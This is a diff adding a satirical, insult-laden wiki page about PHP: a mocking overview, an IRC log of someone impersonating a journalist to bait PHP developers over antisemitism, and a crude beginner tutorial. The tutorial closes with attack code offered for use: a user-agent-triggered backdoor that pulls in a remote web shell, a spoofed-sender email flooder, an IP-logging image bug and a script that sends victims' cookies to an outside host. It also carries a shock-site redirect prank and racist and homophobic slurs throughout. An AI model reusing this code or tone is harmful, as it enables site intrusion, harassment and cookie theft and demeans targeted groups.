@@ -1,0 +1,1643 @@
+PHP
+{{haxor}}
+[[Image:Why PHP remains slow.png|thumb|right|Why PHP remains slow.]]
+[[Image:PHP_Rasmus_Lerdof.jpg|thumb|right|Mr. Lerdof, just another Jew-hating [[Canadia]]n]]
+[[Image:Php.gif|thumb|The PHP Logo]]
+
+
+'''PHP''' is a programming language created by [[hippies]] for use by [[13 year old boys]] who only have foreknowledge of [[Microsoft]] Visual Basic and think they are [[Skript kiddie|experts in all things]]. Used mainly for CGI applications, PHP combines the extreme [[shit]]tiness of [[Perl]] and [[C]], without including any of their positive features such as its code looking like line noise, which perl code does. It is a  [[santorum]] of procedural and object-orientated form that transcends any insults you might (and ''will'') want to throw at it. Whenever someone mentions PHP, remember to mention that it lacks namespaces and they are a [[liberal]] for using it.
+
+PHP is often coupled with [[MySQL]], [[Linux]], and [[Apache]] creating the heralded LAMP architecture.  The only thing this LAMP sheds light on is the wonderful crap that people love to pawn off on others because "Its free!!!" However, the internet would not be the wonderfully exasperating and completely maddening place it is today without these wonderful (non)technologies!
+
+However, since [[Encyclopedia Dramatica]] runs on PHP, we love it.
+
+==PHP's Legacy==
+PHP is well known to be one of the most slow, most buggy, and most full of security flaws of the programming languages.  Php.net says their lead developer Pierre-Alain Joye works to fix PHP, but a look at the bug report logs finds that he uses PHP on [[Windows]] and whenever anyone reports bugs from a [[Linux]] operating system, he flags the bug as "bogus".
+
+Have you ever wondered why shared web hosts running Linux don't like to update their PHP versions for years?  Are they just that lazy? Each PHP version is missing half its extensions and has a whole lot of new bugs and when someone on Windows reports this, Pierre-Alain Joye runs right out and does a fix, updating the website, and when it happens on Linux, the bug is flagged as bogus.
+
+==true is false==
+<pre>
+% php5 -a
+Interactive shell
+
+php > if ((true == "foo") && ("foo" == 0) && (0 == false)) echo "yay!";
+yay!
+</pre>
+
+==PHP DID WTC==
+[[Last Thursday]] it was discovered that the people over at php.net hate the Jews.
+
+===Chat log===
+Adam39 trolling Rasmus (founder of php or some such faggotry):
+<pre>* Now talking in #php.pecl
+* Topic is 'babylonians of the world uníte!'
+* Set by andrei!~andrei@borndress-lm.corp.yahoo.com on Thu Aug 03 13:27:07
+* Chocula has quit IRC (Chocula)
+<adam39> hi my name is adam, i am a writer for the Canadian Jewish News (a subdivision of the CJC
+ www.cjc.ca)
+<adam39> anyone would like to comment on the Jani Taskinen 'incident'
+<adam39> ?
+<adam39> i am writing an article on the subject
+<adam39> and i would like to hear the 'other side' of the story
+<adam39> tried contacting mr Taskinen but i was not able to reach him and he didnt answered my 
+email, yet
+<andrei> adam39, no comment
+<adam39> PHP official statement is 'no comment' ?
+<andrei> you can treat as official as you want. i'm just saying, no comment.
+<adam39> ok good
+<adam39> i will name you as the source of the 'no comment' ok ?
+<adam39> hello ?
+<andrei> sure, as long as you realize that we don't have an official spokesperson
+<andrei> i wouldn't want to give an impression that i speak for the group
+<adam39> i dont really want official spokeperson
+<andrei> fair enough
+<andrei> then you have my answer :)
+<adam39> just want to get some input from others php dev
+<andrei> good luck
+<andrei> i'm out
+<adam39> bye bye
+* andrei has quit IRC (This computer has gone to sleep)
+<adam39> anyone else would like to comment ?
+<adam39> article should be out tommorow morning
+<adam39> will be published in about 3 canadian national newspapers
+<adam39> as well as a few CJN websites
+* arjenAU has no idea what this is about
+<adam39> what is the general feeling about the situation in the middle east ?
+<adam39> do you guys believe that israel have gone 'too far' ?
+* arjenAU ponders relevance
+<arjenAU> (to PHP)
+<adam39> well one of the core php-dev expressed virulent anti-semitic behavior on a public forum
+<adam39> this is where the relevance is
+<philip__> this is not a public forum 
+<adam39> comments were made public on slashdot this morning
+<adam39> http://developers.slashdot.org/comments.pl?sid=192445&threshold=-1&commentsort=0&mode=thread&pid=0
+<adam39> talking about nuking 'the jews'
+<adam39> and expressing support for terrorist
+<arjenAU> if it was here, then it's not a public forum. this is a private, invite only irc channel. and 
+everyone speaks for themselves. it would be appropriate to ask the originator of any comments 
+directly, and not cast the net any wider.
+<adam39> also talking about killing israel official
+<adam39> i already contacter the Taskinen as i said
+<adam39> i would just like to know how others php-dev feel about that
+<adam39> and if they also have similar sentiments toward jews in general
+<arjenAU> I appreciate your asking, however that's a bit of a trick question ;-)
+<adam39> how come
+<philip__> this is being blown out of proportion
+<adam39> explain philip__
+<arjenAU> let me state this. I am not a PHP dev, I am merely an invited guest here. I am also jewish. 
+I do know many of the people here personally, including jani. I respect them all for their great work
+ for the PHP project. What they do privately is their own business. Personally, I do not agree with either 
+the Israeli actions or those of others in the region; it's a bloody mess.
+<adam39> noted
+<adam39> thanks for your input
+<arjenAU> and no you may not quote me in the context of this incident.
+<arjenAU> I feel that that would be unnecesarily incendiary.
+<arjenAU> there is no sensible discussion possible either way. it just polarises more, which is actually
+ the fundamental problem. your article will not help.
+<adam39> well since you have not identified yourself
+<adam39> i could actually quote that
+<g0pz> quit the politics man, this is the internet ... 
+<g0pz> where anyone can say anything and anywhere 
+<arjenAU> adam39: indeed. I know the rules. you must also realise that if you move around Internet,
+ you have to play by its rules and understand how it works. otherwise things look really funny.
+<adam39> well its getting political when someone make statement about 'nuking jews'
+<arjenAU> considering your readers will NOT be aware of those rules, this becomes particularly
+ important
+<philip__> adam39: it was said in private, you don't know what he meant by it
+<adam39> my goal is not to shed more dark light on the php project... this already dark enough
+<arjenAU> adam39: would the same apply if anyone said anything about nuking anything else?
+<jome> dark enough?
+<adam39> well i really fail to see different meaning of 'nuking the jews'
+* Chocula has quit IRC (Chocula)
+<arjenAU> adam39: that's not what I asked.
+<adam39> i am speaking about mr Taskinen comments jome
+<philip__> private comments
+<arjenAU> sure. and I'm asking if the issue would be differnet if anyone else said something about 
+others.
+<adam39> arjenAU are you trying to tell me that you feel there is double standard with israel in regard
+ to the media ?
+<arjenAU> adam39: no. I usually mean exactly what I say, so no need to search for inference.
+<adam39> noted
+<arjenAU> and please note again, just for perspective, that I am jewish. however, I don't feel attacked
+ every time someone says 
+something.
+<philip__> i like this note: http://developers.slashdot.org/comments.pl?sid=192445&cid=15800804
+<arjenAU> I get upset when nasty things happen around the world, involving any human.
+<adam39> well you know (and understand why i am sure) that the jewish population (in general) is
+ particulary sensitive to comments 
+about extermination and genocide of is people
+<arjenAU> my family and I are well aware of history. but it would be wrong to jump on individual
+ issues, as it distracts from the bigger 
+picture. every human is important and equal in this respect.
+<adam39> the organisation i am working for (the CJC) is directly concerned when comments like
+ this are being made
+<arjenAU> in context, anyone attacking anyone is of concern. if any action or statement has the
+ word "jew" in it, that doe snot make it any more or less important.
+<adam39> and since we have members in the corporate world that provide direct funding to
+ various php project
+<adam39> it is my duty to make information know to the public in general
+<arjenAU> and so we polarise further rather than adressing the issue.
+<arjenAU> have a nice day.
+<adam39> thanks for your comments arjenAU
+<adam39> i appreciate
+<adam39> i really do
+<philip__> PHP is made up of individuals each of whom have their own opinions with their own
+ circumstances... taking anything from a private irc log, and out of context, is poor judgement
+<arjenAU> yea.
+<adam39> understand philip__, but so far all i got was negative comments toward israel from
+ all php 'official' that i contacted
+<arjenAU> makes for juicy news though.
+<adam39> wich is really strange considering the fact that about the 1/2 of them are jewish ...
+<adam39> it seem to be a pattern
+<arjenAU> adam39: likewise, you will find most sensible americans not liking bush. would that be
+ a surprise?
+<adam39> arjenAU, at the time it was, and as you know the media have covered the issue in deep
+<arjenAU> in that context, one must distinguish a nation's politics from its people, and also a 
+ group of people from a particular nation.
+<adam39> but a group of people is considered of individual
+<adam39> and if 100% of those people harbor anti-semitic views
+<arjenAU> if I dislike israeli politics or a particular aspect on it, this has no bearing on my feelings
+ for individual israelis, or jews in 
+general.
+<adam39> what can be said about the group ?
+<adam39> its like saying the nazi were ok, just a couple of them were bad
+<arjenAU> adam39: are you saying that saying somehting negative about israel equates to 
+ anti-semitic views?
+<adam39> anyway i dont really have time to discuss this
+<arjenAU> please do answer this
+<adam39> not against israel, against jews
+<arjenAU> you just said some ppl said smth about israel. not jews in general.
+<adam39> 2 other core php-dev said and i quote 'i agree with him' about the 'nuke israel' comments
+<arjenAU> so I don't see where you get your conclusion on antisimitism.
+<adam39> wishing to nuke 'the jews' = antisemitism
+<arjenAU> israel != jews
+<arjenAU> israel is a nation state, a political concept.
+<arjenAU> if one says "nuke DC", then they refer to the concept, not the people.
+<arjenAU> it would be very uneducated to infer anything else. but again, I'll grant you it makes
+ for juicy news.
+<adam39> so are you saying that the comments made by mr Taskinen were not anti-semie ?
+<adam39> anti-semite pardon me
+<arjenAU> I don't know, I haven't read them. I was merely questioning your inferring other's comments
+ in the context you were aiming for.
+<adam39> as a jew, do you consider it normal when someone say he want to 'nuke israel'
+<adam39> and also when someone say 'Fuck you jews.' it is anti-semitic by all standard
+<arjenAU> as a human, I might have an opinion on either. yes. being a jew does not make a
+ difference there.
+<philip__> go to war, see friends killed, and let's hear what comes from your mouth in this heat
+ of the moment
+<adam39> so far i what i see is that the php team in general, refuse to condone mr Taskinen
+ comments and some are agreeing with him
+<adam39> and this is troubling in my humble opinion
+<arjenAU> the prob with you asking me this is that any answer is polarising for your story. so I will
+ not comment in that way
+<jome> heh, godwins law!
+<adam39> philip__, being raised in israel, do you really believe that i didnt see what war is like ?
+<adam39> trust me, i did
+<adam39> anyway guys, thanks alot for your input
+* Chocula has joined #php.pecl
+<philip__> i just sense the article you're going to write will be inaccurate and cause even more
+ problems for our world, not solve any
+* Cap`nPECL sets mode: +o Chocula
+<jome> adam39: let's for the moment assume that you had a good friend of yours killed by the
+ country x populated by the group y, would you then - upset and possibly drunk - in a private forum
+ say that you wanted to nuke the country x and the group y?
+<adam39> philipp__ article dont solve any problems
+<arjenAU> what a negative view of journalism and its influence.
+<arjenAU> one would hope for higher aspirations.
+<adam39> and i will only state fact
+<jome> adam39: will you answer my question?
+<adam39> the fact i have so far are the following: anti-semitic comments being made, associate
+ refusing to condone, some denying, some agreeing with them
+<adam39> also a fact is that there is many jewish person in the php-team
+<adam39> wich is rather troubling
+<adam39> jome: i dont see the point of your question
+<jome> adam39: it's a very important one
+<adam39> for who ?
+<jome> for you.
+<adam39> i would never wish genocide to any group
+<jome> adam39: the follow-up question would be: do you think it's fair to write an article about
+ whatever someone said you allegedly said (preferably taken out of context) blowing it up in
+ newspapers?
+* Rasmus has joined #php.pecl
+<jome> adam39: i'm merely asking you if it is possible that you could've said something like that
+ in the heat of the moment.
+* Cap`nPECL sets mode: +o Rasmus
+<adam39> jome , also remember that mr Taskinen is UN, who already served in Lebanon
+<adam39> jome, first i dont drink, so i could not have been drunk
+<jome> adam39: well, let's say you were.
+<adam39> second, as i said no, even in the worst moment i would never wish genocide to any
+ group of people
+<philip__> a nuke is a weapon, not genocide 
+<adam39> only a troubled individual would do that
+<jome> adam39: you don't see my point at all, do you?
+<adam39> why dont you just state your point
+<adam39> instead of trying to do methaphor
+<arjenAU> adam39: you appear to have an incorrect definition of "condone"
+<arjenAU> adam39: opposite to its actual meaning. feel free to look it up at dictionary.com
+<adam39> here is what on of the main php-dev told me
+<arjenAU> "refusing to condone" is a very odd thing to say
+<adam39> "If killing innocent civilians in Gaza and Lebanon is legitimate for Israel, then killing
+ innocent jews is legitimate for everyone else." 
+<adam39> do you agree with that comment ?
+<Rasmus> which php-dev are you talking about?
+<jome> adam39: my point is that perhaps someone might say something they don't really mean
+ because of say stress, or if they're being upset.
+<Rasmus> nobody in the core development group has made any comments relating to this as far
+ as I know
+<arjenAU> killing anyone is not good. regardless of cultural/regligious heritage, innocence (what's
+ that anyway), or whatever.
+<adam39> a well know one, he refused me the right to directly quote him
+<Rasmus> Well, I know all of them, and I'd be extremely surprised if anybody would say anything
+ like that
+<adam39> i would be interested knowing your position on this mr Lerdorf
+<adam39> any official comment
+<Rasmus> I have absolutely no position on any of this.  We don't take political positions.
+<adam39> can i call you tommorow morning for interview ?
+<Rasmus> Nope
+<adam39> so you are refusing to comment on the issue, is that correct ?
+<Rasmus> We develop software
+<Rasmus> Sure
+<adam39> are you also saying that you were not aware of widespread anti-semitic sentiment
+ in the php team 
+* jome giggles
+<Rasmus> You have got to be kidding.
+<jome> 'anti-semitic sentiment in the php team'
+<Rasmus> You are basing all this from a single person.  We have 1100 people working on PHP
+<adam39> more than half of the dev i contacted yes
+<Rasmus> You contacted half of the core php group?
+<adam39> and its not just one, i have been sending mail all day
+<adam39> nah i did not contact the whole team, but a couple dozens i would say
+<adam39> a good baseline in my hunble opinion
+<Rasmus> Well, you are completely offbase.
+<Rasmus> heck, a good number of them are Jewish
+<adam39> this is what i find the most troubling yes
+<Rasmus> anti-semitic Jews really should trouble you and make you question your methods.
+<adam39> i will quote this in my article
+<adam39> good point
+<adam39> what are your personal feelings about the situation in the middle east ?
+* arjenAU sees another twist
+<adam39> and how did you feel when you heard about Taskinen comments regarding jews ?
+<Rasmus> So, once again, this is all about 1 person out of 1100
+<Rasmus> Please make sure you make that clear as well.
+<adam39> no, but since you are the founder i would like your personal opinion on this
+<Rasmus> I think it was an unfortunate emotional comment from someone deeply affected by the
+ situation personally.
+<adam39> article is going to be published in 3 major canadian newspapers as well as a few CJN
+ affiliated websites, believe me i want it to be clear
+<Rasmus> And it has absolutely nothing to do with the PHP project.
+<Rasmus> Trying to connect the two is absurd.
+<adam39> i really appreciate your comments
+<adam39> i really do
+<Rasmus> Well, I don't really appreciate your methods.  Can I have your name, affiliation and contact
+ info for your boss please?
+<adam39> but you might be interested to know that (from what i can see) a large part of php-dev
+ team harbor anti-semitic views
+<adam39> of course Rasmus
+<adam39> want to talk by phone ?
+<Rasmus> Nope.  Just want to pass it on to the lawyers.
+<Rasmus> And give them the heads up
+<adam39> jewish layers ?
+<adam39> hehehe
+<Rasmus> And no, I don't give you permission to quote me in any way.
+<adam39> well since you are a public figure
+<adam39> i dont need your permission actually
+<Rasmus> in a private and completely inappropriate forum for this stuff.
+<adam39> i offered you to talk by phone Lerdorf
+<jome> adam39: http://en.wikipedia.org/wiki/Journalistic_integrity
+<Rasmus> Any interview requests has to go through PR first
+<adam39> if you want contact info, go to the CJC website everything is there
+<arjenAU> adam39: I think it would be appropriate for you to give your full contact details including
+ that of your editor, here. not refer to a general site thing. would be incomplete.
+<adam39> e
+<adam39> everything is on the site for your information
+<Rasmus> but who are you?
+<adam39> i will try to contact you tommorow morning to discuss it
+<Rasmus> There is no Adam listed
+<adam39> my name is ADAM GRACHNIK
+<Rasmus> not listed on the Staff page
+<adam39> i am external contributor
+<adam39> ask them, i am well know over here
+<adam39> also work for 'le devoir' 'journal de montreal' 'ottawa tribute' amongs others
+<adam39> contact the CJN directly if you have any comments
+<adam39> http://www.cjnews.com/
+<adam39> i will personally contact you tommorow morning
+<Rasmus> There is no Adam listed
+<adam39> my name is ADAM GRACHNIK
+<Rasmus> not listed on the Staff page
+<adam39> i am external contributor
+<adam39> ask them, i am well know over here
+<adam39> also work for 'le devoir' 'journal de montreal' 'ottawa tribute' amongs others
+<adam39> contact the CJN directly if you have any comments
+<adam39> http://www.cjnews.com/
+<adam39> i will personally contact you tommorow morning
+<adam39> thanks for the help
+<adam39> i really appreciate your comments
+21:34 <@ifw> I know a little about php. it's like html but fancier.
+</pre>
+
+=="Fun" with PHP==
+What follows is some basic PHP code writen by a [[fucktard]] 13 year old script kiddie. (Please note, because php is [[shit]] You have to be [[Leet|L33T]] to frequent the #php channel on [[quakenet]] - See [[IRC]])
+<pre>
+<php
+
+$age = 10;
+if($E_PenisLength > $ActualPenisLength) 
+{
+	$handle=fopen("Puberty.txt","rb"); 
+	$puberty=fread(filesize("Puberty,.txt"),$handle);
+       
+	if($coder == "A preteen myspace fanboy" && $puberty != "The Next Billion Years")
+	{
+		echo "gay";
+	}
+}
+
+?>
+</pre>
+
+<pre>
+<?PHP
+$r = rand(0,4);
+if ($r==0) {header("Location:http://images.encyclopediadramatica.com/images/d/db/Lemonparty.jpg");}
+if ($r==1) {header("Location:http://www.hai2u.com/HotBlowjob.jpg");}
+if ($r==2) {header("Location:http://images.encyclopediadramatica.com/images/5/5d/Hello.jpg");}
+if ($r==3) {header("Location:http://images.encyclopediadramatica.com/images/9/98/Tubgirl.jpg");}
+if ($r==4) {header("Location:http://www.meatspin.com/");}
+?>
+</pre>
+
+Save as 'saferedirect.php', or some other [[Gay|innocent]] name, upload to Linux server, link to friends, making sure to add a ?url=[innocent url] to the end.
+
+==Tutorial==
+
+PHP is a server side language, meaning you can't see the source code in your browser, because all of the stuff is done on the server. To start, get some web hosting (easy) or start your own server (not as easy), and create a .php file. Having a decent knowledge of [[HTML]] is highly recommended. If you've programmed in another web language such as ASP, or have knowledge of application languages like [[C++]] or [[Java]], learning PHP will be considerably easier. 
+
+=== HELLO WORLD ===
+Yeah... This is the ancient tradition of beginners starting out in any language. Here you go. 
+<source lang="php">
+ <?php
+ echo ("LOL HAI THER AMIDOINITRITE?");
+ ?></source>
+Let's go over some rulez. 
+
+All PHP code starts with <?php and ends with ?>. These are called delimiters. 
+echo is a statement that basically prints out whatever is in the double quotes. It isn't a function. (printf() is though.) 
+All statements in PHP that aren't if/else statements, while, for, do-while, for-each loops, functions, or classes end in semicolons. 
+==== Hello World, Again (with [[HTML]]) ====
+We saw how echo can output text. But it can also output HTML code and JavaScript. Example here. 
+<source lang="php">
+ <?php
+ 
+ echo ("<b>LOL HAI THER</b> <i>AMIDOINITRITE?</i>");
+ 
+ ?></source>
+This'll output '''LOL HAI THER''' ''AMIDOINITRITE''?, and if you look at the source of the PHP page, you'll see the HTML code in there.
+
+=== Variables ===
+Now we'll learn a little about variables. PHP is great because, unlike other languages, you don't need to specify what type of variable you are declaring (integer, Boolean, float, string, etc). PHP automatically identifies the type for you. Anyway, here we go. 
+<source lang="php">
+ <?php
+ $lolvar = 6;
+ $loldecimal = 3.12;
+ $lolstring = "<b>This</b> is a string.";
+ echo ($lolvar);
+ echo ($loldecimal);
+ echo ($lolstring);
+ ?></source>
+
+Some things to note: 
+ 
+When echoing a variable you don't need the double quotes 
+You can also concatenate, or join together, two strings, like so: 
+<source lang="php">
+ <?php
+ $lol = "lol";
+ $wut = "wut";
+ $randomdigit = 2;
+ echo ("Did you just use the meme " . $lol . " " .  $wut . " " .$randomdigit . " times?");
+ ?></source>
+
+This'll just echo out the line "Did you just use the meme lol wut 2 times?". 
+
+
+Note that you can use the value of a variable as the name of another.
+For example:
+<source lang="php">
+ <?php
+ $var="lol";
+ $$var=1;
+ ?></source>
+
+Notice the double $$? Because the value of var was "lol", it created a variable called "lol" with a value of 1.
+NOTE: This really has no use, so don't worry if u don't get it.
+
+====Constants====
+
+<s>ALL VARIABLES START WITH THE DOLLAR SIGN ($) NO EXCEPTIONS</s>
+WRONG!!! Only variables you want to change need a dollar sign ($). If you have, say, the value of pi, that never changes, so you can set a STATIC variable, or a CONSTANT.
+The function to make a constant is '''define('CONSTANT', "value-for-teh-constant");'''
+Example:
+<source lang="php">
+ <?php
+ define('WINS', "lol");
+ echo WINS;
+ ?></source>
+
+This outputs the line "lol".
+
+Rules:
+The constant MUST BE IN ALL CAPS, NO SPACES: e.g.: DB_NAME
+Once it is defined, you can't change it.
+
+=== Predefined variables ===
+Always $_, ex: $_COOKIE, $_SERVER, $_GET, $_REQUEST, and $_POST 
+Some can only be used before any output is sent 
+<source lang="php">
+ <?php
+ 
+ $ip = $_SERVER['REMOTE_ADDR'];
+ $ref = $_SERVER['HTTP_REFERER'];
+ 
+ echo ($ip." Was referred by ".$ref."<br />");
+ 
+ $UserAgent = $_SERVER[HTTP_USER_AGENT];
+ $Software = $_SERVER['SERVER_SOFTWARE'];
+ 
+ echo ("Their useragent was ".$UserAgent."<br />");
+ 
+ echo ("Your server software is ".$Software);
+ 
+ ?></source>
+Will output something like: 
+
+0.0.0.0 Was referred by ----- Their useragent was Mozilla/5.0 Your server software is Apache/2.2.8 (----) DAV/2 mod_ssl/2.2.8 OpenSSL/0.9.8g mod_python/3.3.1 Python/2.5.1 mod_autoindex_color PHP/5.2.5 mod_perl/2.0.3 Perl/v5.8.8 
+
+
+Depending on your server environment. 
+
+==== Types of variables ====
+The datatype a variable uses is usually implicit, meaning PHP will determine what type of variable it should use based on its contents. However, these are some of the datatypes at your disposal.
+
+<pre>Boolean ex: $a = true; #has only 2 possible values, true or false
+Integer ex: $b = 4; #holds whole numbers
+String ex: $c = "Hello"; #holds a set of letters and numbers
+Float ex: $d = 3.5252524; #holds numbers with decimals
+Array ex: $e = array(5, 3, 1); #holds a list of any other type of data, be it an integer, string, boolean, etc.
+Null ex: $f = NULL; #only holds null (nothing)</pre>
+
+=== Operators ===
+==== Arithmetic ====
+ + Addition
+ - Subtraction
+ * Multiplication
+ / Division
+ % Division with remainder 
+==== Assignment ====
+ += ex: n+=7, or N equals N+7
+ -=
+ *=
+ /=
+ %=
+ .=
+ =
+==== Logical ====
+ && , AND ex: if (($a>0) && ($a<10)){
+ || , OR ex: if (($a==0)||($a==1)){
+ ! , NOT ex: if ($a != 2) {
+
+==== Comparison ====
+ < Less than
+ > Greater than
+ == Equal to
+ != Not equal
+ === Identical
+ !== Not identical
+ <= Less than or equal to
+ >= Greater than or equal to
+==== Conditional statements and loops ====
+Now you have a basic understanding of printing things, now it's time to start something else. We will explore loops and conditional statements. Loops will pretty much do something a certain amount of times and conditional statements control what the program does if a condition is fulfilled or not. 
+
+==== Conditional statements ====
+Well, it's basically just if and switch, but the former is pretty useful. You have to know this one. 
+
+==== If ====
+This essentially checks whether or not a condition is true. 
+<source lang="php">
+ <?php
+ $willdo = true;
+ if($willdo == true){
+    echo ("did");
+ }</source>
+An else statement is an addition to an if statement which allows for another condition. If there's an else statement something happens regardless. 
+<source lang="php">
+ $wontdo = false;
+ if($wontdo == true){
+    echo ("did");
+ } else {
+    echo ("didn't");
+ }
+ ?></source>
+Else if statements allow for multiple conditions, if and only if the first condition before it was false. 
+<source lang="php">
+ $maydo = 99;
+ $maynotdo = false;
+ 
+ if($maynotdo == true){
+    echo ("did");
+ } elseif ($maydo == 99){
+    echo ("did anyway");
+ } else {
+    echo ("didn't");
+ }
+ ?></source>
+Also: 
+
+1. conditions in parentheses just have to be true. You don't have to use an == or != if it's a boolean value (true/false) 
+2. there are logical operators like and (&&) and or (||) 
+3. a ! behind it means it's false, so if $dick is true, !$dick is false, and vice versa if $dick was false. 
+==== Switch ====
+A substitute to a whole bunch of elseifs. It tests if a given value is equal to something. Cases can be any value. There's also a default. 
+<source lang="php">
+ <?php
+ switch ($value) {
+ case false:
+    echo ("value is 0");
+    break;
+ case 17:
+    echo ("value is 1");
+    break;
+ case "pigdog":
+    echo ("value is pigdog");
+    break;
+ case NULL:
+    echo ("value is null");
+    break;
+ default:
+    echo ("value is something else other than 0, 1, pigdog, or null.");
+    break;
+ }
+ ?></source>
+=== Loops ===
+There are three main loops: for loops, foreach loops, and while/do-while loops. 
+
+==== For loops ====
+For this loop you simply declare a variable as a counter, and the loop will occur as many times as you want it until the counter reaches a certain number. 
+<source lang="php">
+ <?php
+ 
+ $counter = 0; 
+ for($counter = 0; $counter < 6; $counter++)
+  {
+   echo ("HAI</br>");
+  }
+ 
+ ?></source>
+What this code does is take the variable we made, and use it as a counter. As long as the variable, $counter, is less than 6, the ++ operator will add one to the value of $counter and then the code within the curly braces {} will be executed. So the output of this code is: 
+
+HAI 
+
+HAI 
+
+HAI 
+
+HAI 
+
+HAI 
+
+Some notes about this code: 
+
+1. The ++ operator adds one to a variable, and can be used on any variable. This is an example of a unary operator. You could also use -- to subtract one from the variable. 
+2. Notice that the for loop did NOT end in a semicolon. This is intended. Loops and conditionals don't need a semicolon. But the code inside of the curly braces DOES need the semicolons. 
+
+==== Foreach loops ====
+This statement essentially sets the number of times something's done. In PHP you use it on arrays to run through every element in an array to do something or another. 
+<source lang="php">
+ <?php
+ 
+ $lolarray = array("lol", "rofl", "lmao");
+ 
+ foreach($lolarray as $value){
+    echo ($value . "</br">);
+ }
+ ?></source>
+This code will output: 
+
+lol 
+
+rofl 
+
+lmao 
+
+Also: 
+
+1. you might want to unset(), or destroy the variable you use. You never know. 
+2. foreach($array as $key => $value) will assign $key as a key, but it's basically the same. 
+
+==== While loops ====
+This is probably the simplest loop there is. As long as a condition is true, this loop will run. If the condition is false or if break is used it'll stop the loop. Be careful not to create an infinite loop or your internets will explode; also, if the conditions aren't met or defined the code inside won't run. 
+
+Like this. 
+<source lang="php">
+ <?php
+ $fuckme = false;
+ while($fuckme){ /* or while($fuckme == true) */
+    echo ("This loop won't run.\n");
+ }</source>
+But this will run. 
+<source lang="php">
+ $fucku = 17;
+ while($fucku == 17){
+    echo ("This loop will run. Infinitely.\n);
+ }
+ ?></source>
+This one will run too, but it'll stop after a while. (you would use a for loop in this position though) 
+<source lang="php">
+ <?php
+ $rapeher = 0
+ while($rapeher <= 5){
+    $lolkay = 5 - $rapeher 
+    echo ("This will run for ". $lolkay ." more times after this..\n");
+    $rapeher++;
+ }
+ echo "Done.";
+ ?></source>
+This will produce: 
+
+This will run for 5 more times. 
+
+This will run for 4 more times. 
+
+This will run for 3 more times. 
+
+This will run for 2 more times. 
+
+This will run for 1 more times. 
+
+This will run for 0 more times. 
+
+Done. 
+
+This isn't as useful as you imagine though. 
+
+==== Do-while loops ====
+This does the same thing as a while loop but it checks the condition after the action's done. If the condition's true it repeats itself, but if it's false it does it once and only once. 
+<source lang="php">
+ <?php
+ $roofie = false;
+ do {
+   echo ("Did it anyway, lol");
+ } while ($roofie);
+ ?></source>
+This is useful if you want the code run at least once but not necessarily further times. 
+
+==== Simple Backdoor in PHP ====
+Because many of you want to go straight to the uber hax, I'll add this little bit in. Please stop reading and Google up the following if you don't know this already: 
+
+1. Basic Understanding of PHP 
+2. Remote File Inclusion 
+3. Basic web hacking 
+4. Web shell (c99, x2300 Locus7s, r57, etc.) 
+5. User Agents and how to change them 
+
+Now that you have an idea of what these are, here is how to backdoor a page. If you have access to someone's website, you can slip in this little bit into the PHP page to backdoor their site. When you visit that page with the specified user agent, a web shell will automatically be included. Backdooring a site is recommended for most purposes, because if the site fixes whatever vulnerability you used to get in, you'll still have access. Anyways here is the backdoor: 
+<source lang="php">
+ <?php
+ 
+ $blackdoor = $_SERVER['HTTP_USER_AGENT']; 
+ if($blackdoor == "PUT YOUR USER AGENT HERE") 
+  { 
+   @include('PUTTHEURLTOYOURWEBSHELLHERE'); 
+  } 
+ 
+ ?></source>
+
+==== Email flooder in PHP ====
+If you want to just copy this and run it off a server, go ahead. Unfortunately most free PHP hosts don't allow you to send mail, but I guess you can run it off your localhost. You must have access to the sendmail binary on your system to run; it's just a matter of configuring php.ini, which I won't go into now. 
+
+You need to have: 
+
+1. a server 
+2. basic knowledge of PHP 
+3. knowledge on how to install/configure your PHP (pop quiz: should register_globals be kept on or off?)
+<source lang="php"> 
+ <?php
+    $spam= $_POST["spams"]; 
+ // define number of spam cycles
+ 
+    $iloled = $_POST["message"];
+ // this is the message
+ 
+    $email = $_POST["email"];
+ // define recipient
+ 
+    $rofl = $_POST["body"];
+ // your message
+ 
+    function head() {
+       $sender = $_POST["sender"];
+       $header = 'MIME-Version: 1.0 \r\n
+    Content-type: text/html; charset=iso-8859-1 \r\n
+    From: <' . $sender . '>';
+ 
+       return($header);
+    }
+ // spoofed header. i found it easier to write it this way.
+ 
+    if(isset($_POST["email"])) {
+       for($i = 1; $i <= $spam; $i++){
+ 
+          for($ii = 0; $ii <= $_POST["spams"]; $ii++){
+ 
+             mail($_POST["email"], $iloled,$rofl,head());
+ 
+          } // (the second for loop) defines one cycle
+ 
+          echo("Done $i loops of $spam<br/>"); //we're done
+  
+       }
+    echo("Complete."); 
+    }
+    else {
+  /* if the form isn't filled out show it. also, mess around with this  part any way you like. */
+ ?>
+ 
+ <form method="post" action="">
+    Victim: <input type="text" size="28" name="email"><br/>
+    Message title: <input type="text" size="28"
+ name="message"><br/>
+    Sender (spoof it): <input type="text" size="28"
+ name="sender"><br/>
+    Message body: <textarea name="body" cols="28"
+ rows="5"></textarea><br/>
+    Emails per cycle (default 10): <input type="text" size="28"
+ name="spams" value="10"><br/>
+    Cycles (default 10):<input type="text" size="28"
+ name="cycles" value="10"><br/>
+ <input type="submit" name="submit" value="Click for lulz">
+ </form>
+ 
+ <?php 
+ }
+ ?></source>
+
+=== Image bugs ===
+Pretty fucking simple, really. You insert the following into an e-mail or something: 
+
+c
+
+Then in iplulz.php on your server (or whatever you call it), put this code: 
+
+''PROTIP: Make a directory on your server called niggerimage.png or any image name, then save the code as index.php in the directory.''
+<source lang="php">
+ <?PHP
+ $the_image = "yourimagehere.jpg";
+ $ip_lister = fopen("ip.list", "a+");
+ fwrite($ip_lister, $_SERVER['REMOTE_ADDR'] . " fell for it lol\n");
+ fclose($ip_lister);
+ if (!strncasecmp(substr($the_image, strlen($the_image) - 4), ".jpg"))   
+ $image_mime = "jpeg";
+ else $image_mime = substr($the_image, (strrpos($the_image, '.') + 1));
+ header("Content-Type: image/$image_mime");
+ echo file_get_contents($the_image);
+ ?></source>
+
+User gets the image, you get their IP added to a list. EVERYONE WINS
+
+Also, can steel cookies in dat way:
+<source lang="php">
+ <?PHP
+ $the_image = "yourimagehere.jpg";
+ $ip_lister = fopen("ip.list", "a+");
+ fwrite($ip_lister, $_GET['d0ngz'] . " nigger\n");
+ fclose($ip_lister);
+ if (!strncasecmp(substr($the_image, strlen($the_image) - 4), ".jpg"))   
+ $image_mime = "jpeg";
+ else $image_mime = substr($the_image, (strrpos($the_image, '.') + 1));
+ header("Content-Type: image/$image_mime");
+ echo file_get_contents($the_image);
+ ?></source>
+
+And in email or whatevastuff put
+<source lang="javascript">
+ <script>
+ document.write("<img src='http://anonym.to/http://niggerz.com/fag.php?d0ngz="+ document.cookie+"'><br />'");
+ </script></source>
+
+==Advanced PHP==
+
+[[File:PHP.gif|right]]
